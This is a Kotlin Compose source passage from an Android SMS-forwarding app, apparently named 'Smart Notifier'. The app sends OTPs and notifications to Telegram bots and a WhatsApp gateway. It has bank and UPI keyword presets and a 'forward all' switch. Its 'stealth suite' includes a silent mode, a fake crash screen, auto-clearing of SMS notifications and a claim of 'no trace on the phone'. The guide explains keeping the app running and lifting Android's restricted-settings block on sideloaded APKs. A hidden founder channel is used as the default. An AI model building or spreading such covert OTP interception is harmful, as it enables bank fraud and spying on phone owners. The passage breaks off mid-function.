    val isMasterFounder = remember { CloudflareLicenseManager.isMasterFounder(context) }

    // 1. Telegram 1 State (Sanitized: Never expose Founder credentials in customer text fields)
    var isTelegramEnabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_enabled", true)) }
    var botToken by remember {
        val raw = prefs.getString("bot_token", "") ?: ""
        if (raw == TelegramHelper.DEFAULT_BOT_TOKEN) {
            prefs.edit().remove("bot_token").apply()
            mutableStateOf("")
        } else {
            mutableStateOf(raw)
        }
    }
    var chatId by remember {
        val raw = prefs.getString("chat_id", "") ?: ""
        if (raw == TelegramHelper.DEFAULT_CHANNEL_ID || raw == TelegramHelper.DEFAULT_USER_ID) {
            prefs.edit().remove("chat_id").apply()
            mutableStateOf("")
        } else {
            mutableStateOf(raw)
        }
    }
    var telegramStatus by remember { mutableStateOf("") }

    // 2. Telegram 2 State
    var isTelegram2Enabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_2_enabled", false)) }
    var botToken2 by remember { mutableStateOf(prefs.getString("bot_token_2", "") ?: "") }
    var chatId2 by remember { mutableStateOf(prefs.getString("chat_id_2", "") ?: "") }
    var telegram2Status by remember { mutableStateOf("") }

    // 3. WhatsApp State (CallMeBot Ghost Gateway)
    var isWhatsAppEnabled by remember { mutableStateOf(prefs.getBoolean("is_whatsapp_enabled", false)) }
    var waPhone by remember { mutableStateOf(prefs.getString("wa_phone", "") ?: "") }
    var waApiKey by remember { mutableStateOf(prefs.getString("wa_api_key", "") ?: "") }
    var waStatus by remember { mutableStateOf("") }

    // 4. Pro Features
    var isOnlyOtpMode by remember { mutableStateOf(prefs.getBoolean("only_otp_mode", false)) }
    var isLowBatteryAlertEnabled by remember { mutableStateOf(prefs.getBoolean("low_battery_alert_enabled", false)) }

    // 5. Stealth & Protection Suite State (Clean: Zero Broken Icon Hiding)
    var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
    var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
    var isFakeCrashEnabled by remember { mutableStateOf(prefs.getBoolean("fake_crash_enabled", false)) }
    var isAutoClearSms by remember { mutableStateOf(prefs.getBoolean("auto_clear_sms_notification", false)) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(vertical = 8.dp)
    ) {
        // Quick Help Guide Banner
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("❓ Kaise Use Karein? (Setup Guide)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFA5B4FC))
                    Text("Telegram Bot aur WhatsApp jodne ka 1 minute ka simple guide", fontSize = 11.sp, color = TextSecondary)
                }
                Button(
                    onClick = onOpenHelp,
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                    shape = RoundedCornerShape(8.dp),
                    contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                ) {
                    Text("Guide", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // 24/7 Autostart & Deep Sleep Protection Card (Brand Auto-Detector)
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("⚡ 24/7 Autostart (${Build.MANUFACTURER.uppercase()})", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFFBBF24))
                    Text("Phone ki company ke hisab se direct Autostart settings kholein", fontSize = 11.sp, color = TextSecondary)
                }
                Button(
                    onClick = {
                        BrandAutoStartHelper.openAutoStartSettings(context)
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD97706)),
                    shape = RoundedCornerShape(8.dp),
                    contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                ) {
                    Text("Settings", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color.White)
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Live Help & Customer Support Card
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("💬 Help & Live Support Desk", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFA5B4FC))
                    Text("Direct chat karein ya photo/PDF bhejkar sahayata lein", fontSize = 11.sp, color = TextSecondary)
                }
                Button(
                    onClick = onOpenSupportChat,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
                    shape = RoundedCornerShape(8.dp),
                    contentPadding = PaddingValues(horizontal = 14.dp, vertical = 6.dp)
                ) {
                    Text("Chat", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Only OTP Mode
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("⚡ Only OTP Mode (1-Tap Copy)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF67E8F9))
                    Text("Dost ko message ki jagah sirf 6-digit OTP code bhejega", fontSize = 11.sp, color = TextSecondary)
                }
                Switch(
                    checked = isOnlyOtpMode,
                    onCheckedChange = { checked ->
                        isOnlyOtpMode = checked
                        prefs.edit().putBoolean("only_otp_mode", checked).apply()
                    }
                )
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Low Battery Alert
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("🔋 Low Battery Telegram Alert", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = AccentAmber)
                    Text("Phone battery 15% hote hi Telegram par alert aayega", fontSize = 11.sp, color = TextSecondary)
                }
                Switch(
                    checked = isLowBatteryAlertEnabled,
                    onCheckedChange = { checked ->
                        isLowBatteryAlertEnabled = checked
                        prefs.edit().putBoolean("low_battery_alert_enabled", checked).apply()
                    }
                )
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Telegram 1 (Primary)
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("📢 Telegram 1 (Primary Bot)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AccentEmerald)
                        Text("100% Ghost Stealth (Phone me koi trace nahi)", fontSize = 11.sp, color = TextSecondary)
                    }
                    Switch(
                        checked = isTelegramEnabled,
                        onCheckedChange = { isTelegramEnabled = it }
                    )
                }

                if (isMasterFounder) {
                    Spacer(modifier = Modifier.height(8.dp))
                    Surface(
                        color = Color(0xFF1E1B4B),
                        shape = RoundedCornerShape(10.dp),
                        border = BorderStroke(1.dp, Color(0xFF4338CA))
                    ) {
                        Column(modifier = Modifier.fillMaxWidth().padding(10.dp)) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Text("👑 Founder VIP Ghost Channel Connected", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFA5B4FC))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("• Encrypted", fontSize = 10.sp, color = AccentEmerald)
                            }
                            Spacer(modifier = Modifier.height(2.dp))
                            Text(
                                "Master channel backend me secure linked hai. Private Token ya Chat ID screen par kabhi leak nahi hoga.",
                                fontSize = 10.sp,
                                color = Color(0xFF94A3B8)
                            )
                        }
                    }
                }

                if (isTelegramEnabled) {
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = if (isMasterFounder) "Custom Bot Token (Optional)" else "Bot Token 1")
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = if (isMasterFounder) "Custom Channel ID (Optional)" else "Channel / Chat ID 1 (e.g. -100...)")
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            telegramStatus = "Testing Telegram 1..."
                            scope.launch {
                                val tokenToUse = if (botToken.trim().isNotEmpty()) botToken.trim() else if (isMasterFounder) TelegramHelper.DEFAULT_BOT_TOKEN else ""
                                val chatToUse = if (chatId.trim().isNotEmpty()) chatId.trim() else if (isMasterFounder) TelegramHelper.DEFAULT_CHANNEL_ID else ""
                                if (tokenToUse.isEmpty() || chatToUse.isEmpty()) {
                                    telegramStatus = "❌ Bot Token aur Chat ID enter karein"
                                    return@launch
                                }
                                val res = TelegramHelper.sendMessage(
                                    tokenToUse,
                                    chatToUse,
                                    "🎉 Smart Notifier: Telegram 1 connection verified successfully!"
                                )
                                telegramStatus = if (res.first) "✅ Telegram 1 Connected!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF047857)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test Telegram 1", fontSize = 13.sp)
                    }
                    if (telegramStatus.isNotEmpty()) {
                        Text(
                            text = telegramStatus,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (telegramStatus.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                            modifier = Modifier.padding(top = 4.dp)
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Telegram 2 (Secondary)
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("📢 Telegram 2 (2nd Account / Bot)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF34D399))
                        Text("Dusre bot ya backup channel ke liye", fontSize = 11.sp, color = TextSecondary)
                    }
                    Switch(
                        checked = isTelegram2Enabled,
                        onCheckedChange = { isTelegram2Enabled = it }
                    )
                }

                if (isTelegram2Enabled) {
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = botToken2, onValueChange = { botToken2 = it }, label = "Bot Token 2")
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = chatId2, onValueChange = { chatId2 = it }, label = "Channel / Chat ID 2")
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            telegram2Status = "Testing Telegram 2..."
                            scope.launch {
                                val token = if (botToken2.trim().isNotEmpty()) botToken2.trim() else botToken.trim()
                                val res = TelegramHelper.sendMessage(
                                    token,
                                    chatId2.trim(),
                                    "🎉 Smart Notifier: Telegram 2 connection verified!"
                                )
                                telegram2Status = if (res.first) "✅ Telegram 2 Connected!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF065F46)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test Telegram 2", fontSize = 13.sp)
                    }
                    if (telegram2Status.isNotEmpty()) {
                        Text(
                            text = telegram2Status,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (telegram2Status.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                            modifier = Modifier.padding(top = 4.dp)
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: WhatsApp Forwarding (CallMeBot Ghost Gateway)
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("💬 WhatsApp Forwarding", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF2DD4BF))
                        Text("CallMeBot Cloud Gateway (Phone me koi chat record nahi)", fontSize = 11.sp, color = TextSecondary)
                    }
                    Switch(
                        checked = isWhatsAppEnabled,
                        onCheckedChange = { isWhatsAppEnabled = it }
                    )
                }

                if (isWhatsAppEnabled) {
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = waPhone, onValueChange = { waPhone = it }, label = "WhatsApp Mobile No. (e.g. 919876543210)")
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = waApiKey, onValueChange = { waApiKey = it }, label = "CallMeBot API Key")
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            waStatus = "Testing WhatsApp..."
                            scope.launch {
                                val res = WhatsAppHelper.sendMessage(waPhone.trim(), waApiKey.trim(), "🎉 Smart Notifier: WhatsApp delivery test successful!")
                                waStatus = if (res.first) "✅ WhatsApp Test Sent!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0F766E)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test WhatsApp", fontSize = 13.sp)
                    }
                    if (waStatus.isNotEmpty()) {
                        Text(
                            text = waStatus,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (waStatus.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                            modifier = Modifier.padding(top = 4.dp)
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Stealth & Security Controls (Clean, 100% Reliable Suite)
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("🛡️ Stealth & Protection Suite", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFA78BFA))
                Text("Security locks aur silent operation configure karein:", fontSize = 11.sp, color = TextSecondary)
                Spacer(modifier = Modifier.height(12.dp))

                // Silent Stealth Mode
                SettingToggleRow("Silent Stealth Mode", isSilentMode) { silent ->
                    isSilentMode = silent
                    prefs.edit().putBoolean("show_screen_popups", !silent).apply()
                }

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)

                // Fingerprint / PIN Lock
                SettingToggleRow("Fingerprint / PIN Lock", isAppLockEnabled) { checked ->
                    isAppLockEnabled = checked
                    prefs.edit().putBoolean("app_lock_enabled", checked).apply()
                }

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)

                // Fake Crash Disguise
                SettingToggleRow("Fake Crash Screen (3-Tap Unlock)", isFakeCrashEnabled) { checked ->
                    isFakeCrashEnabled = checked
                    prefs.edit().putBoolean("fake_crash_enabled", checked).apply()
                }

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)

                // Auto-Clear SMS Notifications
                SettingToggleRow("Auto-Clear SMS Notifications", isAutoClearSms) { checked ->
                    isAutoClearSms = checked
                    prefs.edit().putBoolean("auto_clear_sms_notification", checked).apply()
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Save All Button
        Button(
            onClick = {
                val editor = prefs.edit()
                    .putBoolean("is_telegram_enabled", isTelegramEnabled)
                    .putBoolean("is_telegram_2_enabled", isTelegram2Enabled)
                    .putString("bot_token_2", botToken2.trim())
                    .putString("chat_id_2", chatId2.trim())
                    .putBoolean("is_whatsapp_enabled", isWhatsAppEnabled)
                    .putString("wa_phone", waPhone.trim())
                    .putString("wa_api_key", waApiKey.trim())
                    .putBoolean("only_otp_mode", isOnlyOtpMode)
                    .putBoolean("low_battery_alert_enabled", isLowBatteryAlertEnabled)
                    .putBoolean("app_lock_enabled", isAppLockEnabled)
                    .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
                    .putBoolean("auto_clear_sms_notification", isAutoClearSms)

                // Zero-Leak Protection: Never persist founder credentials in public customer keys
                val cleanBotToken = botToken.trim()
                if (cleanBotToken.isNotEmpty() && cleanBotToken != TelegramHelper.DEFAULT_BOT_TOKEN) {
                    editor.putString("bot_token", cleanBotToken)
                } else if (cleanBotToken == TelegramHelper.DEFAULT_BOT_TOKEN) {
                    editor.remove("bot_token")
                } else {
                    editor.putString("bot_token", "")
                }

                val cleanChatId = chatId.trim()
                if (cleanChatId.isNotEmpty() && cleanChatId != TelegramHelper.DEFAULT_CHANNEL_ID && cleanChatId != TelegramHelper.DEFAULT_USER_ID) {
                    editor.putString("chat_id", cleanChatId)
                } else if (cleanChatId == TelegramHelper.DEFAULT_CHANNEL_ID || cleanChatId == TelegramHelper.DEFAULT_USER_ID) {
                    editor.remove("chat_id")
                } else {
                    editor.putString("chat_id", "")
                }

                editor.apply()
                Toast.makeText(context, "✅ Settings Saved!", Toast.LENGTH_SHORT).show()
            },
            modifier = Modifier.fillMaxWidth().height(50.dp),
            shape = RoundedCornerShape(12.dp),
            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo)
        ) {
            Text("💾 Save Configuration", fontSize = 15.sp, fontWeight = FontWeight.Bold)
        }

        Spacer(modifier = Modifier.height(24.dp))
    }
}

@Composable
fun QuickSetupGuideDialog(
    context: Context,
    onDismiss: () -> Unit
) {
    var selectedGuideTab by remember { mutableStateOf(0) }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Color(0xFF0F172A),
        title = {
            Text("❓ Smart Notifier Setup Guide", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFFA5B4FC))
        },
        text = {
            Column(modifier = Modifier.fillMaxWidth().verticalScroll(rememberScrollState())) {
                // Tab switcher
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    Button(
                        onClick = { selectedGuideTab = 0 },
                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 0) AccentIndigo else Color(0xFF1E293B)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("⚡ Autostart", fontSize = 9.sp, maxLines = 1)
                    }
                    Button(
                        onClick = { selectedGuideTab = 1 },
                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 1) AccentIndigo else Color(0xFF1E293B)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("📢 Telegram", fontSize = 9.sp, maxLines = 1)
                    }
                    Button(
                        onClick = { selectedGuideTab = 2 },
                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 2) AccentIndigo else Color(0xFF1E293B)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("💬 WhatsApp", fontSize = 9.sp, maxLines = 1)
                    }
                    Button(
                        onClick = { selectedGuideTab = 3 },
                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 3) AccentIndigo else Color(0xFF1E293B)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
                        modifier = Modifier.weight(1.1f)
                    ) {
                        Text("🔒 Android 13/14", fontSize = 9.sp, maxLines = 1)
                    }
                }

                Spacer(modifier = Modifier.height(14.dp))

                if (selectedGuideTab == 0) {
                    // Autostart Guide
                    Text("⚡ 24/7 Autostart & Battery (Sabse Zaroori):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFFBBF24))
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        "1. Xiaomi, Vivo, Oppo, Realme aur Samsung phone me background apps 2-3 ghante baad apne aap band ho jati hain.\n" +
                        "2. Isse bachne ke liye Dashboard par diya gaya '🚀 1-Click Active' button dabayein.\n" +
                        "3. Ye button aapke phone ki company khud pehchan kar sidha Autostart / Battery setting page khol dega.\n" +
                        "4. Wahan jakar Smart Notifier ko 'Autostart ON' karein aur Battery Saver ko 'No restrictions / Unrestricted / Allow' par set karein.\n\n" +
                        "✅ Done! Iske baad phone kabhi bhi app ko band nahi karega aur 24 ghante OTP bina kisi rukawat ke forward hoga.",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        lineHeight = 16.sp
                    )
                } else if (selectedGuideTab == 1) {
                    // Telegram Guide
                    Text("📢 Telegram Bot Setup (Sirf 1 Minute):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentEmerald)
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        "1. Telegram app me search karein: @BotFather\n" +
                        "2. Wahan /newbot likhein aur apne bot ka koi bhi naam dalein.\n" +
                        "3. BotFather aapko ek lamba Token dega (jaise 8680515171:AAF...).\n" +
                        "4. Us Token ko copy karke yahan 'Bot Token 1' me paste karein.\n" +
                        "5. Telegram me ek naya Channel banayein aur apne bot ko us channel ka Admin bana dein.\n" +
                        "6. Channel ka Chat ID (jaise -100...) yahan 'Channel ID 1' me daal kar Save kar dein!\n\n" +
                        "✅ Done! Ab har OTP turant aapke channel par aayega.",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        lineHeight = 16.sp
                    )
                } else if (selectedGuideTab == 2) {
                    // WhatsApp Guide
                    Text("💬 WhatsApp Setup (CallMeBot):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF2DD4BF))
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        "1. WhatsApp kholiye aur is number par message bhejiye:\n" +
                        "   👉 +34 644 44 24 53\n" +
                        "2. Message me likhiye:\n" +
                        "   'I allow callmebot to send me messages'\n" +
                        "3. CallMeBot 5 second ke andar aapko ek API Key bhej dega.\n" +
                        "4. Wahi API Key yahan app me 'CallMeBot API Key' me daal dein.\n" +
                        "5. Apna WhatsApp mobile number international format me dalein (e.g. 919876543210).\n\n" +
                        "🛡️ Ghost Stealth: Phone ke WhatsApp me koi message ya chat history nahi banti!",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        lineHeight = 16.sp
                    )
                } else {
                    // Android 13/14 Restricted Settings Unlock Guide
                    Text("🔒 Android 13/14 Restricted Settings Unlock:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFFBBF24))
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        "Google ne Android 13 aur Android 14 me naya security block joda hai jisse APK install karne par Notification permissions grey/band rehti hain.\n\n" +
                        "Isko kholne ka 10 second ka simple tarika:\n" +
                        "1. Autostart screen me diye gaye '⚙️ App Info' button par click karein.\n" +
                        "2. App Info page par sabse upar right corner me 3-dots [⋮] ya teer [↗] icon par tap karein.\n" +
                        "3. 'Allow restricted settings' select karein aur phone fingerprint/PIN enter karein.\n" +
                        "4. Wapas app me aakar '⚙️ Allow' button dabayein, switch turant ON ho jayega!\n\n" +
                        "✅ Iske baad Smart Notifier bina kisi rukawat ke 24 ghante background me OTP forward karta rahega.",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        lineHeight = 16.sp
                    )
                }
            }
        },
        confirmButton = {
            Button(
                onClick = onDismiss,
                colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                shape = RoundedCornerShape(8.dp)
            ) {
                Text("Got It", fontSize = 12.sp, fontWeight = FontWeight.Bold)
            }
        }
    )
}

@Composable
fun KeywordsTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var forwardAll by remember { mutableStateOf(prefs.getBoolean("forward_all_notifications", false)) }
    var keywordsList by remember { mutableStateOf(KeywordManager.getKeywords(context)) }
    var newKeywordText by remember { mutableStateOf("") }
    var testSender by remember { mutableStateOf("AD-UPEGOV-S") }
    var testMessage by remember { mutableStateOf("OTP for Authentication is : 240833 --eDistrict UP") }
    var testResult by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(vertical = 8.dp)
    ) {
        // Forward ALL Master Card
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("⚡ Forward ALL Notifications", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFFBBF24))
                    Text(
                        text = if (forwardAll) "🟢 ON: Har SMS aur Notification forward hoga" else "⚪ OFF: Sirf filtered keywords hi forward honge",
                        fontSize = 11.sp,
                        color = TextSecondary
                    )
                }
                Switch(
                    checked = forwardAll,
                    onCheckedChange = { checked ->
                        forwardAll = checked
                        prefs.edit().putBoolean("forward_all_notifications", checked).apply()
                    }
                )
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Preset Quick Action Buttons
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("⚡ 1-Click Rule Presets", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = TextPrimary)
                Spacer(modifier = Modifier.height(8.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(
                        onClick = {
                            keywordsList = KeywordManager.resetDefaults(context)
                            Toast.makeText(context, "eDistrict Rules Loaded!", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF065F46)),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("🏢 eDistrict UP", fontSize = 11.sp)
                    }
                    Button(
                        onClick = {
                            val bankRules = listOf("SBI", "HDFC", "ICICI", "PNB", "AXIS", "PAYTM", "GPAY")
                            bankRules.forEach { KeywordManager.addKeyword(context, it) }
                            keywordsList = KeywordManager.getKeywords(context)
                            Toast.makeText(context, "Bank Rules Added!", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E3A8A)),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("🏦 Banks & UPI", fontSize = 11.sp)
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Add Keyword Input
        Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
            Box(modifier = Modifier.weight(1f)) {
                MncTextField(value = newKeywordText, onValueChange = { newKeywordText = it }, label = "Add Keyword (e.g. CSC, EDIST)")
            }
            Spacer(modifier = Modifier.width(8.dp))
            Button(
                onClick = {
                    if (newKeywordText.trim().isNotEmpty()) {
                        keywordsList = KeywordManager.addKeyword(context, newKeywordText.trim())
                        newKeywordText = ""
                    }
                },
                shape = RoundedCornerShape(10.dp),
                colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                modifier = Modifier.height(52.dp)
            ) {
                Text("+ Add", fontSize = 13.sp, fontWeight = FontWeight.Bold)
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Active Rules List
        Text("Current Active Filters (${keywordsList.size}):", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = TextSecondary)
        Spacer(modifier = Modifier.height(6.dp))

        Column(modifier = Modifier.fillMaxWidth()) {
            keywordsList.forEach { kw ->
                MncCard(modifier = Modifier.padding(vertical = 4.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(horizontal = 14.dp, vertical = 10.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Text("🏷️ $kw", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
                        IconButton(onClick = {
                            keywordsList = KeywordManager.removeKeyword(context, kw)
                        }) {
                            Text("❌", fontSize = 12.sp)
                        }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Live Test Simulator
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("🧪 Test Keyword Match (Live Simulator)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFA78BFA))
                Spacer(modifier = Modifier.height(8.dp))
                MncTextField(value = testSender, onValueChange = { testSender = it }, label = "Sender ID")
                Spacer(modifier = Modifier.height(6.dp))
                MncTextField(value = testMessage, onValueChange = { testMessage = it }, label = "SMS Message Body")
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = {
                        val matches = KeywordManager.matches(context, testSender, testMessage)
                        testResult = if (matches) "✅ MATCH! Ye message forward hoga." else "❌ REJECT! Match nahi hua."
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6D28D9))
                ) {
                    Text("Check Match", fontSize = 13.sp)
                }
                if (testResult.isNotEmpty()) {
                    Text(
                        text = testResult,
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (testResult.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                        modifier = Modifier.padding(top = 8.dp)
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))
    }
}

@Composable
fun HistoryTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var historyList by remember { mutableStateOf(HistoryManager.getHistory(context)) }
    var isAutoClearHistory by remember { mutableStateOf(prefs.getBoolean("auto_clear_history_24h", false)) }

    Column(modifier = Modifier.fillMaxSize().padding(vertical = 8.dp)) {
        Row(
            modifier = Modifier.fillMaxWidth(),
